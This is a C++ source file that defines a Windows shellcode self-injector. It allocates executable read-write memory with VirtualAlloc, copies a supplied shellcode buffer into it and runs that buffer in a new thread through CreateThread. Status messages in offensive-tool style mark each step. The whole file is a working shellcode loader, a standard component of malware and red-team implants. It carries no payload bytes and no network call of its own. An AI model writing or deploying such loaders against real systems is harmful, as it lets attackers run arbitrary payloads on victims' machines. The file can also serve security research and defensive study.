#include "ShellcodeSelfInjector.h"

#include <Windows.h>
#include <iostream>

namespace ShellcodeExecution
{
    void ShellcodeSelfInjector::Execute()
    {
        SelfInjection();
    }

    int ShellcodeSelfInjector::SelfInjection()
    {
        // Allocate memory for the shellcode
        LPVOID allocatedMemory = VirtualAlloc(NULL, this->_shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

        if (allocatedMemory == NULL)
        {
            std::cout << "[!!] Failed to allocate memory: " << GetLastError() << std::endl;
            return -1;
        }

        std::cout << "[+] Memory allocated at address: " << allocatedMemory << std::endl;

        // Copy the shellcode to the allocated memory
        RtlCopyMemory(allocatedMemory, this->_shellcode, this->_shellcodeSize);

        std::cout << "[+] Shellcode written to allocated memory" << std::endl;

        // Create a thread to execute the shellcode
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);

        if (hThread == NULL) {
            std::cout << "[!!] Failed to create thread: " << GetLastError() << std::endl;
            return -1;
        }

        std::cout << "[+] Thread created" << std::endl;

        // Wait for the thread to finish
        WaitForSingleObject(hThread, INFINITE);

        std::cout << "[*] Closing thread handle..." << std::endl;

        CloseHandle(hThread);

        std::cout << "[*] Freeing memory..." << std::endl;

        // Free the allocated memory
        VirtualFree(allocatedMemory, 0, MEM_RELEASE);

        std::cout << "[*] Exiting" << std::endl;

        return 0;
    }
}
